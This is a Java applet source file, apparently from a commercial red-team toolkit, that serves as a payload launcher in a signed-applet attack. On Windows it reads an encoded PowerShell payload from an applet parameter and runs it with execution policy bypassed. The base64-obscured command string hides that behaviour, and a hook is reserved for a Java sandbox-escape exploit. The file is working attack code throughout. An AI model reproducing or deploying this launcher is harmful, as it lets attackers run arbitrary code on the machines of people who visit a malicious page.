/*
 * (c) 2015 Strategic Cyber LLC
 *
 * See http://www.advancedpentest.com/license
 */
import java.applet.*;

import java.io.*;
import java.awt.*;

import java.net.*;
import java.util.*;

import java.lang.reflect.*;

public class Main implements Runnable {
	protected Applet applet;

	public Main(Applet ap) {
		this.applet = ap;
	}

	public void check() {
		/* the purpose of this method is to invoke an exploit to disable the Java security sandbox.
		   by default, we do nothing, because it's assumed Main will be used by itself in a signed
		   applet attack. Child classes can override this though. */
	}

	public void run() {
		/* detect which payload we're going to drop */
		if ((System.getProperty("os.name") + "").indexOf("indows") > -1) {
			/* try to inject our Win32 payload... if this fails, resort to the Java payload */
			runApplet();
		}
	}

	public boolean runApplet() {
		try {
			/* applet.cna will transform our shellcode into a ready-to-execute base64 encoded PowerShell blob */
			String encodedCommand = applet.getParameter("id");

			/* ask PowerShell to run the above command */
			Runtime.getRuntime().exec(new String(Base64.decode("cG93ZXJzaGVsbCAtbm9wIC1leGVjIGJ5cGFzcyAtRW5jb2RlZENvbW1hbmQgIg=="), "UTF-8") + encodedCommand + "\"");
			return true;
		}
		catch (Throwable ex) {
			return false;
		}
	}
}
